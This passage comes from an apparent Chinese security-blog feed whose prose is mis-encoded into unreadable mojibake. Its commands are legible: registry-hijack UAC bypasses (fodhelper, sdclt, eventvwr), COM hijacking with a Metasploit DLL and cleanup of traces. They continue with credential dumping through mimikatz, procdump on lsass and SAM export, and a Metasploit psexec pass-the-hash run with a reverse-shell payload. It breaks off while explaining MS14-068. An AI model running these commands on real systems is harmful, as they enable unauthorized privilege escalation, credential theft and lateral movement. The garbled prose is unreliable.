ç¨‹åº</p><p>æˆ‘ä»¬ä½¿ç”¨proceemonitoræŸ¥çœ‹äº‹ä»¶æŸ¥çœ‹å™¨å¯åŠ¨çš„æ—¶å€™æ‰§è¡Œäº†ä»€ä¹ˆã€‚æˆ‘ä»¬é€šè¿‡æ’æŸ¥å‘ç°äº†æ­¤å¤„</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302194843185.png" alt="image-20210302194843185"></p><p>å‘ç°ç¨‹åºè¯•å›¾æ‰“å¼€HKCU\Software\Classes\ms-settings\shell\open\commandï¼Œä½†æ˜¯è¿™ä¸ªé¡¹æ²¡æœ‰æ‰¾åˆ°ï¼Œå› ä¸ºè¿™ä¸ªé¡¹å¹¶ä¸å­˜åœ¨ï¼Œäºæ˜¯å®ƒæŸ¥è¯¢ HKCR\ms-settings\Shell\Open,æŸ¥è¯¢æˆåŠŸä¾¿æ‰“å¼€å…¶ä¸‹çš„Commandé”®è¿›è¡ŒæŸ¥è¯¢ã€‚<br>æˆ‘ä»¬å¯ä»¥åŠ«æŒæ³¨å†Œè¡¨ï¼Œå¾€HKCU\Software\Classes\ms-settings\shell\open\commandå†™å…¥æ¶æ„æŒ‡ä»¤ä»è€Œè¾¾åˆ°bypassuacçš„ç›®çš„ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command &#x2F;d C:\Windows\System32\cmd.exe &#x2F;f </span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command &#x2F;v DelegateExecute &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å†™å…¥å¦‚ä¸‹å‘½ä»¤ï¼Œå°±èƒ½è®©Fodhelper.exe æ‰§è¡Œæ—¶è‡ªåŠ¨é«˜æƒé™æ‰§è¡Œcmdçª—å£äº†</p><p>ç„¶åæ¶ˆé™¤ç—•è¿¹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command&quot;</span><br></pre></td></tr></table></figure><h3 id="sdclt"><a href="#sdclt" class="headerlink" title="sdclt"></a>sdclt</h3><p>Win10åè¿™ä¸ªç¨‹åºæ‰æœ‰è‡ªåŠ¨æå‡æƒé™çš„èƒ½åŠ›</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; &#x2F;d C:\Windows\System32\cmd.exe &#x2F;f </span><br><span class="line">reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; &#x2F;v &quot;DelegateExecute&quot; &#x2F;f</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302201240945.png" alt="image-20210302201240945"></p><h3 id="eventvmr"><a href="#eventvmr" class="headerlink" title="eventvmr"></a>eventvmr</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot; &#x2F;d C:\Windows\System32\cmd.exe &#x2F;f</span><br></pre></td></tr></table></figure><p>win10ï¼Œwin7å‡æ— æ•ˆ,ä¸çŸ¥é“æ˜¯å“ªä¸ªç‰ˆæœ¬çš„äº‹äº†ï¼Œåæ­£è®°å½•ä¸‹æ¥å§ã€‚</p><h2 id="COMåŠ«æŒ"><a href="#COMåŠ«æŒ" class="headerlink" title="COMåŠ«æŒ"></a>COMåŠ«æŒ</h2><p>å’ŒdllåŠ«æŒç±»ä¼¼ï¼Œåº”ç”¨ç¨‹åºåœ¨è¿è¡Œæ—¶ä¹Ÿä¼šå»åŠ è½½æŒ‡å®šCLSIDçš„COMç»„ä»¶ï¼Œå…¶åŠ è½½é¡ºåºå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKCU\Software\Classes\CLSID</span><br><span class="line">HKCR\CLSID</span><br><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\</span><br></pre></td></tr></table></figure><p>ä»¥eventvwrä¸ºä¾‹</p><p>æ‰§è¡Œè¯¥ç¨‹åºæ—¶ä¼šå»å¯»æ‰¾{0A29FF9E-7F9C-4437-8B11-F424491E3931}è¿™ä¸ªç»„ä»¶ï¼Œè¿™ä¸ªç»„ä»¶åˆéœ€è¦åŠ è½½InProcServer32æŒ‡å®šçš„DLLï¼Œè€Œè¿™ä¸ªDLLçš„è·¯å¾„å¯ç”±ç”¨æˆ·å®šä¹‰ã€‚</p><p>è€Œeventvwrçš„è¿™ä¸ªç»„ä»¶ä¸€èˆ¬åœ¨HKCR\CLSIDæ‰¾åˆ°ï¼Œæ‰€ä»¥å¯ä»¥æœç´¢è·¯å¾„åŠ«æŒã€‚</p><p>åˆ©ç”¨ä»¥ä¸‹æ–¹æ³•å¯ä»¥åŠ«æŒï¼ˆæœç´¢è·¯å¾„åŠ«æŒï¼‰</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InProcServer32 &#x2F;v &quot;&quot; &#x2F;t REG_SZ &#x2F;d &quot;d:\msf_x64.dll&quot; &#x2F;f </span><br><span class="line"></span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InProcServer32 &#x2F;v &quot;LoadWithoutCOM&quot; &#x2F;t REG_SZ &#x2F;d &quot;&quot; &#x2F;f </span><br><span class="line"></span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InProcServer32 &#x2F;v &quot;ThreadingModel&quot; &#x2F;t REG_SZ &#x2F;d &quot;Apartment&quot; &#x2F;f </span><br><span class="line"></span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\ShellFolder &#x2F;v &quot;HideOnDesktop&quot; &#x2F;t REG_SZ &#x2F;d &quot;&quot; &#x2F;f </span><br><span class="line"></span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\ShellFolder &#x2F;v &quot;Attributes&quot; &#x2F;t REG_DWORD &#x2F;d 0xf090013d &#x2F;f</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨comæ¥å£"><a href="#åˆ©ç”¨comæ¥å£" class="headerlink" title="åˆ©ç”¨comæ¥å£"></a>åˆ©ç”¨comæ¥å£</h2><h3 id="ICMLuaUtil"><a href="#ICMLuaUtil" class="headerlink" title="ICMLuaUtil"></a>ICMLuaUtil</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210304122737764.png" alt="image-20210304122737764"></p><h1 id="UACME"><a href="#UACME" class="headerlink" title="UACME"></a>UACME</h1><p>ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œè®°å½•äº†è®¸å¤šBypassuacçš„æ–¹æ³•ã€‚</p><p><a href="https://github.com/hfiref0x/UACME/tree/v3.2.x">https://github.com/hfiref0x/UACME/tree/v3.2.x</a></p><h1 id="windbgè°ƒè¯•"><a href="#windbgè°ƒè¯•" class="headerlink" title="windbgè°ƒè¯•"></a>windbgè°ƒè¯•</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UAC&quot;&gt;&lt;a href=&quot;#UAC&quot; class=&quot;headerlink&quot; title=&quot;UAC&quot;&gt;&lt;/a&gt;UAC&lt;/h1&gt;&lt;p&gt;ç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼ˆUser Account Controlï¼Œç®€å†™ä½œUAC)æ˜¯&lt;a href=&quot;https://baike.baidu.c</summary>
      
    
    
    
    
    <category term="ææƒ" scheme="http://const27.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>æ¨ªå‘ç§»åŠ¨ä¸åŸŸæ§æƒé™ç»´æŒæ–¹æ³•æ€»æ±‡</title>
    <link href="http://const27.com/2021/06/28/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/"/>
    <id>http://const27.com/2021/06/28/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/</id>
    <published>2021-06-28T13:51:58.227Z</published>
    <updated>2021-08-03T04:44:49.144Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h1><h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>å¦‚æœæ‰¾åˆ°äº†æŸä¸ªç”¨æˆ·çš„ntlm hashï¼Œå°±å¯ä»¥æ‹¿è¿™ä¸ªntlm hashå½“ä½œå‡­è¯è¿›è¡Œè¿œç¨‹ç™»é™†äº†<br>å…¶ä¸­è‹¥hashåŠ å¯†æ–¹å¼æ˜¯ rc4 ï¼Œé‚£ä¹ˆå°±æ˜¯pass the hash<br>è‹¥åŠ å¯†æ–¹å¼æ˜¯aes key,é‚£ä¹ˆå°±æ˜¯pass the key<br>æ³¨æ„NTLMå’Œkerberosåè®®å‡å­˜åœ¨PTH:<br>NTLMè‡ªç„¶ä¸ç”¨å¤šè¯´<br>kerberosåè®®ä¹Ÿæ˜¯åŸºäºç”¨æˆ·çš„client hashå¼€å§‹ä¸€æ­¥æ­¥è®¤è¯çš„ï¼Œè‡ªç„¶ä¹Ÿä¼šå—PTHå½±å“</p><p>é‚£å‰æå°±æ˜¯è¦è·å–hashå€¼äº†</p><h3 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a><strong>KB2871997</strong></h3><p>å¦‚æœç³»ç»Ÿå®‰è£…<strong>KB2871997</strong>è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºç­‰äºwindow server 2012æ—¶(æœåŠ¡å™¨ç‰ˆæœ¬),å¤§äºç­‰äºwin8.1(å®¶åº­ç‰ˆæœ¬)æ—¶ï¼ˆè‡ªå¸¦è¡¥ä¸ï¼‰ï¼Œé»˜è®¤åœ¨lsass.exeè¿™ä¸ªè¿›ç¨‹ä¸­ä¸ä¼šå†å°†å¯é€†çš„å¯†æ–‡ç¼“å­˜åœ¨è‡ªå·±çš„è¿›ç¨‹å†…å­˜ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬é»˜è®¤æ˜¯æ²¡åŠæ³•é€šè¿‡è¯»å–è¿™ä¸ªè¿›ç¨‹ç„¶åé€†å‘è¯¥å¯†æ–‡æ¥è·å–æ˜æ–‡å¯†ç </p><p>è™½ç„¶å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨æ¥ä½¿LSASSå¼ºåˆ¶å­˜å‚¨æ˜æ–‡å¯†ç </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ç§æ–¹å¼è¦æ±‚ç³»ç»Ÿé‡å¯æˆ–è€…ç”¨æˆ·é‡æ–°ç™»å½•ï¼Œåœ¨å®æˆ˜ä¸­æ“ä½œèµ·æ¥æˆåŠŸç‡è¿˜æ˜¯æ¯”è¾ƒä½çš„ã€‚</p><p>åŒæ—¶æ¯”è¾ƒé‡è¦çš„ä¸€ç‚¹æ˜¯å¢åŠ äº†Protected Usersç»„ï¼Œæ‰€å±ç”¨æˆ·ä¼šè¢«å¼ºåˆ¶è¦æ±‚ä½¿ç”¨Kerberosè®¤è¯ï¼Œå¯ä»¥é¿å…PTHæ”»å‡»ï¼Œä»¥åŠç”¨æˆ·æ³¨é”€ååˆ é™¤å‡­è¯(æ˜æ–‡å¯†ç ã€LM/NTLM HASHã€Kerberosçš„TGTç¥¨æ®ç­‰)</p><p>ä»¥åŠï¼šRestricted Admin RDPæ¨¡å¼çš„è¿œç¨‹æ¡Œé¢å®¢æˆ·ç«¯æ”¯æŒ</p><h3 id="å…³äºKB2871997çš„ä¸€ä¸ªè¯¯è§£"><a href="#å…³äºKB2871997çš„ä¸€ä¸ªè¯¯è§£" class="headerlink" title="å…³äºKB2871997çš„ä¸€ä¸ªè¯¯è§£"></a>å…³äºKB2871997çš„ä¸€ä¸ªè¯¯è§£</h3><p>è‡ªwindow vistaä¹‹åæ²¡åŠæ³•ä½¿ç”¨RIDé500çš„æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·æ¥è¿›è¡ŒPass The Hash, ä½†æ˜¯å¦‚æœæ˜¯åŸŸç”¨æˆ·ä¸”è¯¥åŸŸç”¨æˆ·å±äºæœ¬åœ°Administratorsç»„çš„æˆå‘˜ä¹Ÿå¯ä»¥è¿›è¡Œpass the hashã€‚</p><p>å¾ˆå¤šäººæŠŠè¿™ä¸ªåŸå› å½’ç»“äºKB2871997è¡¥ä¸ï¼Œå®é™…ä¸Šä¸ç„¶ï¼Œè¿™ä¸ªäº‹æƒ…çš„æˆå› å®é™…æ˜¯UACåœ¨æ£ä¹±ã€‚UACæ˜¯window Vistaçš„æ–°å®‰å…¨ç»„ä»¶ï¼Œå…·ä½“æ˜¯ä¸ªå•¥è¿™é‡Œä¹Ÿä¸ç»†è¯´äº†ã€‚<br>RIDä¸º500çš„è´¦æˆ·å’Œå±äºæœ¬åœ°administratorsç»„çš„åŸŸç”¨æˆ·åœ¨é€šè¿‡ç½‘ç»œè¿œç¨‹é“¾æ¥æ—¶ï¼Œé»˜è®¤å°±æ˜¯é«˜æƒé™ä»¤ç‰Œã€‚<br>è€ŒéRID500çš„æœ¬åœ°è´¦æˆ·åˆ™ä¸ºä½æƒé™ä»¤ç‰Œï¼Œè‹¥æƒ³æå‡æƒé™åˆ™éœ€é€šè¿‡äº¤äº’æ–¹å¼ç™»å½•åˆ°è¦é€šè¿‡è¿œç¨‹ååŠ©æˆ–è¿œç¨‹æ¡Œé¢ç®¡ç†çš„è®¡ç®—æœºèµ°UACææƒã€‚</p><p>å…³äºè¿™ä¸ªæˆå› çš„ä¸€äº›ç³»ç»Ÿé…ç½®é€‰é¡¹ï¼š</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726202713388.png" alt="image-20210726202713388"></p><p>è¿™ä¸ªé¡¹é»˜è®¤å…è®¸å†…ç½®ç®¡ç†å‘˜è´¦æˆ·ï¼ˆRID500è´¦æˆ·ï¼‰åœ¨æ‰€æœ‰åº”ç”¨ä¸‹éƒ½ä»¥é«˜æƒé™ä»¤ç‰Œè¿è¡Œã€‚è¿™ä¹Ÿæ˜¯RID500è´¦æˆ·èƒ½PTHçš„åŸå› </p><p>ä»¥åŠæ­¤æ³¨å†Œè¡¨é¡¹ï¼Œå¯ä»¥å…³é—­UACçš„è¿œç¨‹é™åˆ¶ï¼Œå³è¿œç¨‹è¿æ¥æ—¶UACä¼šå¤±æ•ˆï¼Œè¿™æ ·çš„è¯åªè¦æ˜¯administratorsç»„çš„ç”¨æˆ·éƒ½èƒ½PTHè¾£ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726202837971.png" alt="image-20210726202837971"></p><p>å…¶ä¸­è¯¥å€¼ä¸º0åˆ™ä»£è¡¨å¼€å¯UACçš„è¿œç¨‹é™åˆ¶,è®¾ç½®è¯¥å€¼ä¸º1æ—¶</p><h3 id="HASHè·å–"><a href="#HASHè·å–" class="headerlink" title="HASHè·å–"></a>HASHè·å–</h3><p>1.ä½¿ç”¨meterpreteré‡Œçš„mimikatzæ¨¡å—</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;load mimikatz</span><br><span class="line">meterpreter&gt;mimikatz_command -f mimikatzçš„æŒ‡ä»¤</span><br><span class="line">privilege::debug ææƒ  samdump::hashes dumpå“ˆå¸Œ  </span><br><span class="line">æˆ–è€…</span><br><span class="line">meterpreter&gt;msv&#x2F;kerberos&#x2F;widgst</span><br></pre></td></tr></table></figure><p>2.ä½¿ç”¨meterpreterè‡ªå¸¦çš„hashè·å–æ¨¡å—</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;hashdump</span><br><span class="line">meterpreter&gt;run windows&#x2F;gather&#x2F;smart_hashdump   (æ¨èä½¿ç”¨è¿™ä¸ª)</span><br></pre></td></tr></table></figure><p>3.å‘ç›®æ ‡æœºä¸Šä¼ mimikatzè¿œç¨‹è°ƒç”¨mimikatz.exe dumpå‡ºhashï¼Œmimikatzéœ€è¦å…æ€å¤„ç†<br>æ„æ€å°±æ˜¯æ—¢ç„¶æˆ‘ä»¬è·å–åˆ°äº†shellï¼Œæˆ‘ä»¬ç›´æ¥å‘ç›®æ ‡æœºä¸Šä¼ ä¸€ä¸ªmimikatzç„¶ååœ¨shellé‡Œä½¿ç”¨å®ƒå°±è¡Œäº†. ä½¿ç”¨æ–¹æ³•ä¸ºcmdçª—å£æ‰“å¼€mimikatz.exeï¼Œè¿›å…¥mimikatzç»ˆç«¯ï¼Œç„¶åè¾“å…¥mimikatzæŒ‡ä»¤å³å¯</p><p>4.ä¸Šä¼ procdumpåˆ°ç›®æ ‡æœºï¼Œè·å–åˆ°lsass.dmpæ–‡ä»¶åå°†å…¶ä¼ å›æœ¬åœ°åˆmimikatzæ¥dumpå“ˆå¸Œ</p><p>procdump.exeæ˜¯å¾®è½¯è‡ªå¸¦çš„ç¨‹åºï¼Œæ‰€ä»¥ä¸ä¼šè§¦å‘æ€æ¯’ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡å®ƒä¼ å›lsass.dmpæœ¬åœ°æå–hash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp  æ‰§è¡Œè¯¥æŒ‡ä»¤ï¼Œè·å–åˆ°lsass.dmp</span><br><span class="line">ç„¶åå°†å…¶ä¼ å›æœ¬åœ°</span><br><span class="line">é€šè¿‡mimikatz.exeåˆ†åˆ«æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</span><br><span class="line">&quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130719.png" alt="QQæˆªå›¾20210217130719"></p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>ï¼š<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a><br><a href="https://github.com/gentilkiwi/mimikatz/releases">mimikatz</a>ï¼š<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><p>5.ä½¿ç”¨cobalt strike è·å–hash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&gt;hashdump</span><br><span class="line">beacon&gt;mimikatz mimikatzæŒ‡ä»¤</span><br></pre></td></tr></table></figure><p>6.åˆ©ç”¨samè¡¨</p><p>mimikatzåœ¨çº¿è¯»samè¡¨ä¸­çš„hash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><p>å°†samè¡¨ä¸‹è½½åˆ°æœ¬åœ°ç”±mimikatzåˆ†æ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br><span class="line">åœ¨è¿œç«¯shellä½¿ç”¨ä»¥ä¸Šå‘½ä»¤å¯¼å‡ºSYSTEM å’Œ SAMæ–‡ä»¶ï¼Œå¹¶å°†å…¶å¾…ä¼šæœ¬åœ°ï¼Œç”±mimikatzåˆ†æ</span><br><span class="line">mimikatzè¿è¡Œ</span><br><span class="line">mimikatz # lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM</span><br><span class="line">Domain : STU1</span><br><span class="line">SysKey : fd4639f4e27c79683ae9fee56b44393f</span><br><span class="line">Local SID : S-1-5-21-1982601180-2087634876-2293013296</span><br><span class="line"></span><br><span class="line">SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : liukaifeng01</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br></pre></td></tr></table></figure><h3 id="hash-ä¼ é€’æ”»å‡»-PTH-ï¼ˆPass-the-Hash"><a href="#hash-ä¼ é€’æ”»å‡»-PTH-ï¼ˆPass-the-Hash" class="headerlink" title="hash ä¼ é€’æ”»å‡» PTH ï¼ˆPass the Hash)"></a>hash ä¼ é€’æ”»å‡» PTH ï¼ˆPass the Hash)</h3><p>1.msfé‡Œä½¿ç”¨psexecæ¨¡å—</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;psexec  &#x2F;&#x2F;ä»¥rootå¯åŠ¨msf</span><br><span class="line">[*] No payload configured, defaulting to windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhsot 192.168.64.133</span><br><span class="line">lhsot &#x3D;&gt; 192.168.64.133</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhost 192.168.64.133</span><br><span class="line">lhost &#x3D;&gt; 192.168.64.133</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lport 443</span><br><span class="line">lport &#x3D;&gt; 443</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set rhost 192.168.52.138</span><br><span class="line">rhost &#x3D;&gt; 192.168.52.138</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBUser Administrator</span><br><span class="line">SMBUser &#x3D;&gt; Administrator</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBPass 8a963371a63944419ec1adf687bb1be5  &#x2F;&#x2F;ä¸€èˆ¬é€‰æ‹©NTLM HASH</span><br><span class="line">SMBPass &#x3D;&gt; 8a963371a63944419ec1adf687bb1be5</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; run</span><br></pre></td></tr></table></figure><p>2.ä½¿ç”¨mimikatz</p><p>æˆ‘ä»¬åœ¨ç›®æ ‡æœºé‡Œæ”¾ç½®mimikatz.exe ç„¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:&quot;xxx.com&quot; &#x2F;ntlm:6542d35ed5ff6ae5e75b875068c5d3bc  &#x2F;&#x2F;è‡ªè¡Œä¿®æ”¹</span><br></pre></td></tr></table></figure><p>ä¹‹åä¾¿ä¼šå¼¹å‡ºä¸€ä¸ªcmdçª—å£ï¼Œåœ¨è¿™ä¸ªçª—å£é‡Œé“¾æ¥æœºå™¨å³å¯</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.222.131\c$</span><br></pre></td></tr></table></figure><p>3.ä½¿ç”¨cobalt strike</p><p>åœ¨cobalt strikeé‡Œæ‰¾åˆ°åŸŸæ§ï¼Œç„¶åä½¿ç”¨psexecæ¨¡å—ï¼Œé€‰æ‹©ä¸€ä¸ªæœ¬åœ°hashå³å¯ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130746.png" alt="QQæˆªå›¾20210217130746"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130806.png" alt="QQæˆªå›¾20210217130806"></p><h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>è¿™ä¸ªæ´çš„å±å®³å¾ˆå¤§ï¼Œå¯ä»¥è®©ä»»æ„åŸŸç”¨æˆ·ææƒåˆ°åŸŸç®¡ã€‚<br>é€‚ç”¨ç‰ˆæœ¬: server 2000ä»¥ä¸Š<br>è¡¥ä¸: kb3011780</p><h3 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h3><p>PACæ˜¯kerberosåè®®é‡Œç”¨æ¥è§£å†³ç”¨æˆ·æƒé™åŠŸèƒ½æ‰€è®¾è®¡å‡ºçš„ä¸œè¥¿ã€‚<br>åœ¨kerberosåè®®é‡Œé¢ï¼Œä¸€ä¸ªç”¨æˆ·ç”¨è‡ªå·±çš„hashæ‹¿åˆ°äº†TGTï¼Œæ¥ç€å‡­å€Ÿç€TGTæ‹¿åˆ°äº†TGSï¼Œæ¥ç€ç”¨TGSå»è®¿é—®æœåŠ¡ã€‚çœ‹ä¼¼åªè¦hashæ­£ç¡®ï¼Œç”¨æˆ·å°±èƒ½åˆ°å¤„è®¿é—®æœåŠ¡ï¼Œä½†æ˜¯æ‰€æœ‰æœåŠ¡éƒ½å¯ä»¥ç»™è¿™ä¸ªç”¨æˆ·æ‰€è®¿é—®å—ï¼Ÿè‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œæ‰€ä»¥å¾®è½¯åœ¨kerberosä¸ºäº†å®ç°ç”¨æˆ·æƒé™åˆ†çº§ï¼Œé‡‡ç”¨äº†PACã€‚<br>PACè¢«è®¾è®¡ä¸ºå­˜åœ¨äºTGTé‡Œé¢ã€‚å®Œæ•´çš„kerberosæƒé™éªŒè¯æµç¨‹å¦‚ä¸‹ã€‚</p><p>1ã€‚ç”¨æˆ·å‡­å€Ÿè‡ªå·±çš„hashåŠ å¯†æ—¶é—´æˆ³å¹¶å‘é€æ˜æ–‡ç”¨æˆ·ååˆ°KDCï¼ŒKDCè®¤è¯ç”¨æˆ·æˆåŠŸåè¿”å›è¢«krbtgtç”¨æˆ·hashåŠ å¯†çš„TGT(å†…æœ‰ticektåŒ…å«ç€PAC)ï¼Œä»¥åŠç”¨æˆ·è‡ªèº«hashåŠ å¯†çš„login session key</p><p>2.ç”¨æˆ·å‡­å€ŸTGTç¥¨æ®å‘KDCå‘èµ·æŒ‡å®šæœåŠ¡çš„TGS_REQã€‚KDCç”¨krbtgt hashè§£å¯†ï¼Œè‹¥è§£å¯†æˆåŠŸåˆ™ç›´æ¥è¿”å›æœåŠ¡hashåŠ å¯†çš„TGSï¼ˆè¿™é‡Œå¹¶æ²¡è€ƒè™‘ç”¨æˆ·çš„æƒé™ï¼Œç›´æ¥è¿”å›äº†TGSï¼‰</p><p>3.ç”¨æˆ·ç”¨TGSå‘æœåŠ¡å‘èµ·è¯·æ±‚ï¼ŒæœåŠ¡ç”¨è‡ªå·±çš„hashè§£å¯†TGSåè·å¾—PACï¼Œæ‹¿ç€PACå‘KDCè¯¢é—®è¯¥ç”¨æˆ·æ˜¯å¦æœ‰æƒé™è®¿é—®ã€‚KDCæ‹¿åˆ°PACåå†æ¬¡è§£å¯†ï¼Œå¾—åˆ°äº†PACé‡Œçš„ ç”¨æˆ·çš„sidï¼Œä»¥åŠæ‰€åœ¨çš„ç»„ï¼Œå†åˆ¤æ–­ç”¨æˆ·æ˜¯å¦æœ‰è®¿é—®æœåŠ¡çš„æƒé™ï¼ˆæœ‰äº›æœåŠ¡ä¸ä¼šéªŒè¯KDCï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´ç™½é“¶ç¥¨æ®æ”»å‡»)</p><p>PACè‡ªèº«çš„ç»“æ„</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217131035.png" alt="QQæˆªå›¾20210217131035"></p><p>PACåœ¨Ticketä¸­çš„ç»“æ„</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217131108.png" alt="QQæˆªå›¾20210217131108"></p><p>åˆè¿™ä¸ªå›¾å¯ä»¥çŸ¥é“,PACåªä¸è¿‡æ˜¯ticketé‡ŒAuthorization DATAçš„ä¸€ä¸ªåˆ†æ”¯ã€‚<br>è€ŒAuthorization dataçš„ç»“æ„æ˜¯è¿™æ ·çš„</p><p>AuthorizationData    ::= SEQUENCE OF SEQUENCE {<br>ad-type     [0] Int32,<br>ad-data     [1] OCTET STRING }</p><p>ad-typeä¸­å°±æœ‰è¿™ä¹ˆä¸€ä¸ªç±»å‹ AD-IF-RELEVANT 